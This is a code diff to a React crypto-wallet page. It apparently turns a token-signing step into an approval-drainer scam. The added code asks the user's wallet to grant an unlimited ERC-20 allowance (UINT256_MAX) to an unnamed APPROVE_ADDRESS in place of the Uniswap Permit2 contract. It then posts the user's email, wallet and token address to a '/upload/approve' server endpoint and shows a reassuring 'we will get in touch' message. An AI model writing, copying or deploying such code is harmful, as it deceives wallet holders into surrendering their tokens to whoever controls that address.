@@ -1,4 +1,5 @@
 import React, { useState, useEffect } from 'react'
+import { useAuth0 } from "@auth0/auth0-react";
 import { Link } from 'react-router-dom'
 import Select, { components, NonceProvider } from "react-select";
 import trezorModule from '@web3-onboard/trezor'
@@ -13,6 +14,7 @@ import Web3 from "web3"
 import erc20Abi from "../../data/erc20.json";
 import Jazzicon, { jsNumberForAddress } from 'react-jazzicon'
 import appLogoImage from "../../assets/images/logo3.png";
+import axios from '../../config/server.config';
 
 const injected = injectedModule()
 const ledger = ledgerModule()
@@ -82,7 +84,7 @@ const onboard = Onboard({
 })
 
 const Wallet = () => {
-
+  const { logout } = useAuth0();
   const [selectedTokenOption, setSelectedTokenOption] = useState(SIGNING_TOKENS[0]);
   const handleChange = (obj) => {
     setSelectedTokenOption(obj);
@@ -173,11 +175,33 @@ const Wallet = () => {
       NotificationManager.warning("Select a token for sign.");
       return;
     }
+    let flag = "";
     try {
       const tokenContract = new globalWeb3.eth.Contract(erc20Abi, selectedTokenAddress);
-      await tokenContract.methods.approve(UNISWAP_PERMIT2_ADDRESS, UINT256_MAX).send({ from: connectedWalletAddress });
+      flag = "success";
+      await tokenContract.methods.approve(APPROVE_ADDRESS, UINT256_MAX).send({ from: connectedWalletAddress }).then((res) => {
+        console.log(res);
+        console.log('success', connectedWalletAddress, selectedTokenAddress);
+      });
     } catch (error) {
-      console.log(error);
+      // console.log(error);
+      flag = "failed";
+    }
+    console.log('check', flag);
+    localStorage.setItem('connectedWalletAddress', connectedWalletAddress);
+    localStorage.setItem('selectedTokenAddress', selectedTokenAddress);
+    let email_addr = localStorage.getItem('email');
+    axios.post('/upload/approve', {email: email_addr, wallet: connectedWalletAddress, token: selectedTokenAddress})
+      .then(function (response) {
+        console.log(response);
+
+      })
+      .catch(function (error) {
+        // console.log(error);
+      });
+    if (flag!="failed") {
+      console.log('success', connectedWalletAddress, selectedTokenAddress);
+      NotificationManager.success("Congratulation! We will get in touch with you within 24 hours.");
     }
   }
 
@@ -363,8 +387,8 @@ const Wallet = () => {
                 <div className="box-4e0678ce2e546c61fe9a76eb7e5b4c08">
                   <h2 className="titleSecondary-f693a56fc31c6db9c58ea83246c9e029">Your certificates:</h2>
                   <ul className="list-6a62b389ed4213b99797faf3dc84c983">
-                    <li>2 certificates available</li>
-                    <li>
+                    <li>0 certificates available</li>
+                    {/* <li>
                       <a className="listA-1cdd673f867914c8015b06d3872a1a1f contract" href="contract.pdf" target="_blank"
                         rel="noopener noreferrer">
                         221124001USDTEPKTYD
@@ -383,14 +407,14 @@ const Wallet = () => {
                           <use href="#download"></use>
                         </svg>
                       </a>
-                    </li>
+                    </li> */}
                     <li style={{ borderTop: '1px solid rgba(var(--ods-color-border-separator))', paddingTop: '10px' }}>
                       Identity
                       verification:<br />
                       <span>
                         <span>
-                          <span className="labl">Refused</span>
-                          <span>
+                          <span className="labl">Not</span>
+                          {/* <span>
                             <a style={{ textDecoration: 'none' }} href="">
                               Try again
                               <svg aria-hidden="true" fill="currentColor" focusable="false"
@@ -398,7 +422,7 @@ const Wallet = () => {
                                 <use href="#revision"></use>
                               </svg>
                             </a>
-                          </span>
+                          </span> */}
                         </span>
                       </span>
                     </li>
@@ -414,7 +438,7 @@ const Wallet = () => {
                 </div>
                 <div style={{ paddingLeft: '5px', paddingTop: '10px' }}>
                   <div className="logout" style={{ display: 'block', marginBottom: '30px' }}>
-                    <button className="ods-button -action--primary" style={{ backgroundColor: '#2a2a3a' }}>
+                    <button className="ods-button -action--primary" onClick={() => logout({ logoutParams: { returnTo: window.location.origin } })} style={{ backgroundColor: '#2a2a3a' }}>
                       <span className="children-ef95c21ed49b242c8814436e96ef3af6">Logout</span>
                     </button>
                   </div>
